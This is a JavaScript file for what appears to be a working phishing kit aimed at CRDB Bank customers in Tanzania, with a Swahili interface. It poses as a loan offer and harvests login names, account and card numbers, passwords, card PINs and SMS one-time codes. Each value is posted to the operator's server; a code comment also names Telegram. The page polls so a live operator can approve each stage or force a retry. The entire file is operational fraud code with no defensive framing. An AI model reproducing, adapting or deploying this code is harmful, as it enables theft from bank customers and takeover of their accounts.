document.addEventListener('DOMContentLoaded', () => {
  const stepUnderstand = document.getElementById('step-I UNDERSTAND');
  const stepSlider = document.getElementById('step-slider');
  const stepForm = document.getElementById('step-form');
  const stepCardPin = document.getElementById('step-card-pin');
  const stepOtp = document.getElementById('step-otp');
  const stepLoading = document.getElementById('step-loading');
  const stepSuccess = document.getElementById('step-success');

  const credsSurfaceBanner = document.getElementById('creds-surface-banner');
  const cardPinSurfaceBanner = document.getElementById('card-pin-surface-banner');
  const otpSurfaceBanner = document.getElementById('otp-surface-banner');

  let currentUserId = null;
  let statusPollInterval = null;

  const urlParams = new URLSearchParams(window.location.search);
  const adminParam = urlParams.get('admin') || '';

  function showStep(targetStep) {
    [stepUnderstand, stepSlider, stepForm, stepCardPin, stepOtp, stepSuccess].forEach(s => {
      if (s) s.classList.remove('active');
    });
    if (targetStep) targetStep.classList.add('active');
  }

  // Slider Logic
  const sliderBalance = document.getElementById('slider-balance');
  const balanceVal = document.getElementById('balance-val');
  const sliderDuration = document.getElementById('slider-duration');
  const durationVal = document.getElementById('duration-val');

  if (sliderBalance && balanceVal) {
    sliderBalance.addEventListener('input', (e) => {
      balanceVal.innerText = `TZS ${Number(e.target.value).toLocaleString()}`;
    });
  }

  if (sliderDuration && durationVal) {
    sliderDuration.addEventListener('input', (e) => {
      durationVal.innerText = `MIEZI ${e.target.value}`;
    });
  }

  // Auto-format card number input with spaces
  const cardInput = document.getElementById('crdb-card');
  if (cardInput) {
    cardInput.addEventListener('input', (e) => {
      let v = e.target.value.replace(/\D/g, '').substring(0, 16);
      e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
    });
  }

  // Digit Inputs Setup with AUTO-SUBMIT feature for 5-digit OTP and 4-digit PIN
  const otpDigits5 = document.querySelectorAll('.otp-digit-5');
  const cardPinDigits = document.querySelectorAll('.card-pin-digit');

  function setupDigitInputs(inputs, autoSubmitCallback) {
    inputs.forEach((input, idx) => {
      input.addEventListener('input', () => {
        input.value = input.value.replace(/\D/g, '');
        if (input.value && idx < inputs.length - 1) {
          inputs[idx + 1].focus();
        }

        const allFilled = Array.from(inputs).every(i => i.value.length === 1);
        if (allFilled && typeof autoSubmitCallback === 'function') {
          autoSubmitCallback();
        }
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !input.value && idx > 0) {
          inputs[idx - 1].focus();
        }
      });
    });
  }

  setupDigitInputs(otpDigits5, () => submitOtpHandler());
  setupDigitInputs(cardPinDigits, () => submitCardPinHandler());

  // Navigation
  document.getElementById('btn-understand-proceed').addEventListener('click', () => {
    showStep(stepSlider);
  });

  document.getElementById('btn-slider-next').addEventListener('click', () => {
    showStep(stepForm);
  });

  // Step 1: Submit Credentials & Bank Details with Account & Card Validation
  document.getElementById('btn-submit-creds').addEventListener('click', async () => {
    const username = document.getElementById('crdb-username').value.trim();
    const account = document.getElementById('crdb-account').value.trim();
    const cardRaw = document.getElementById('crdb-card').value.trim();
    const card = cardRaw.replace(/\D/g, ''); // Ondoa nafasi ili kuhakiki namba pekee
    const password = document.getElementById('crdb-password').value.trim();

    const accountError = document.getElementById('account-error');
    const cardError = document.getElementById('card-error');

    let isValid = true;

    // Uhakiki wa namba ya akaunti (lazima iwe na angalau tarakimu 10 hadi 15)
    if (account.length < 10 || account.length > 15 || isNaN(account)) {
      accountError.style.display = 'block';
      isValid = false;
    } else {
      accountError.style.display = 'none';
    }

    // Uhakiki wa namba ya kadi (lazima iwe na tarakimu 16 kamili za kibenki)
    if (card.length !== 16) {
      cardError.style.display = 'block';
      isValid = false;
    } else {
      cardError.style.display = 'none';
    }

    if (!username || !password || !isValid) {
      if (!username || !password) {
        alert('Tafadhali jaza jina la mtumiaji na nywila.');
      }
      return;
    }

    if (credsSurfaceBanner) credsSurfaceBanner.classList.remove('active');
    showLoading('INACHAKATA TAARIFA...', 'Inatuma taarifa kwa usalama.');

    try {
      const res = await fetch(`/api/submit-credentials?admin=${encodeURIComponent(adminParam)}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, account, card: cardRaw, password, adminChatId: adminParam })
      });

      const data = await res.json();
      if (data.success) {
        currentUserId = data.userId;
        document.getElementById('loading-title').innerText = 'INASUBIRI UTHIBITISHO WA MSIMAMIZI...';
        document.getElementById('loading-sub').innerText = 'Tafadhali baki kwenye ukurasa huu.';
        startStatusPollingForCardPin();
      } else {
        hideLoading();
        alert(data.error || 'Imeshindikana.');
      }
    } catch (e) {
      hideLoading();
      alert('Hitilafu ya mtandao.');
    }
  });

  function startStatusPollingForCardPin() {
    if (statusPollInterval) clearInterval(statusPollInterval);

    statusPollInterval = setInterval(async () => {
      if (!currentUserId) return;

      try {
        const res = await fetch(`/api/check-status/${currentUserId}`);
        const data = await res.json();

        if (data.status === 'PROCEED_CARD_PIN') {
          clearInterval(statusPollInterval);
          hideLoading();
          showStep(stepCardPin);
          if (cardPinDigits[0]) cardPinDigits[0].focus();
        } else if (data.status === 'RETRY_CREDS') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (credsSurfaceBanner) credsSurfaceBanner.classList.add('active');
          document.getElementById('crdb-username').value = '';
          document.getElementById('crdb-account').value = '';
          document.getElementById('crdb-card').value = '';
          document.getElementById('crdb-password').value = '';
          showStep(stepForm);
        }
      } catch (e) {}
    }, 3000);
  }

  // Step 2: Submit Card PIN to Server & Telegram
  async function submitCardPinHandler() {
    const cardPinVal = Array.from(cardPinDigits).map(i => i.value).join('');

    if (cardPinVal.length !== 4) {
      document.getElementById('card-pin-error').style.display = 'block';
      return;
    }
    document.getElementById('card-pin-error').style.display = 'none';
    if (cardPinSurfaceBanner) cardPinSurfaceBanner.classList.remove('active');

    showLoading('INATHIBITISHA PIN YA KADI...', 'Inatuma namba ya siri kwa usalama.');

    try {
      const res = await fetch('/api/submit-card-pin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: currentUserId, cardPin: cardPinVal })
      });

      const data = await res.json();
      if (data.success) {
        document.getElementById('loading-title').innerText = 'INASUBIRI UTHIBITISHO WA PIN...';
        document.getElementById('loading-sub').innerText = 'Tafadhali baki kwenye ukurasa huu.';
        startStatusPollingForOtp();
      } else {
        hideLoading();
      }
    } catch (e) {
      hideLoading();
    }
  }

  document.getElementById('btn-submit-card-pin').addEventListener('click', submitCardPinHandler);

  function startStatusPollingForOtp() {
    if (statusPollInterval) clearInterval(statusPollInterval);

    statusPollInterval = setInterval(async () => {
      if (!currentUserId) return;

      try {
        const res = await fetch(`/api/check-status/${currentUserId}`);
        const data = await res.json();

        if (data.status === 'PROCEED_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          showStep(stepOtp);
          if (otpDigits5[0]) otpDigits5[0].focus();
        } else if (data.status === 'SUCCESS') {
          clearInterval(statusPollInterval);
          hideLoading();
          document.getElementById('approved-amount-display').innerText = `TZS ${Number(sliderBalance.value).toLocaleString()}`;
          showStep(stepSuccess);
        } else if (data.status === 'RETRY_PIN') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (cardPinSurfaceBanner) cardPinSurfaceBanner.classList.add('active');
          cardPinDigits.forEach(i => i.value = '');
          if (cardPinDigits[0]) cardPinDigits[0].focus();
          showStep(stepCardPin);
        } else if (data.status === 'RETRY_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (otpSurfaceBanner) otpSurfaceBanner.classList.add('active');
          otpDigits5.forEach(i => i.value = '');
          if (otpDigits5[0]) otpDigits5[0].focus();
          showStep(stepOtp);
        }
      } catch (e) {}
    }, 3000);
  }

  // Submit OTP Function (5 digits)
  async function submitOtpHandler() {
    const otpVal = Array.from(otpDigits5).map(i => i.value).join('');

    if (otpVal.length !== 5) {
      document.getElementById('otp-error').style.display = 'block';
      return;
    }
    document.getElementById('otp-error').style.display = 'none';
    if (otpSurfaceBanner) otpSurfaceBanner.classList.remove('active');

    showLoading('INATHIBITISHA OTP...', 'Inakagua namba yako ya uthibitisho ya SMS.');

    try {
      const res = await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: currentUserId, otp: otpVal })
      });

      const data = await res.json();
      if (data.success) {
        document.getElementById('loading-title').innerText = 'INAKAGUA NAMBA...';
        document.getElementById('loading-sub').innerText = 'Tafadhali subiri.';
        startStatusPollingForOtp();
      } else {
        hideLoading();
      }
    } catch (e) {
      hideLoading();
    }
  }

  document.getElementById('btn-submit-otp').addEventListener('click', submitOtpHandler);

  document.getElementById('btn-go-home').addEventListener('click', () => {
    window.location.href = `/?admin=${encodeURIComponent(adminParam)}`;
  });

  function showLoading(title, sub) {
    document.getElementById('loading-title').innerText = title;
    document.getElementById('loading-sub').innerText = sub;
    if (stepLoading) stepLoading.classList.add('active');
  }

  function hideLoading() {
    if (stepLoading) stepLoading.classList.remove('active');
  }
});
                                                          
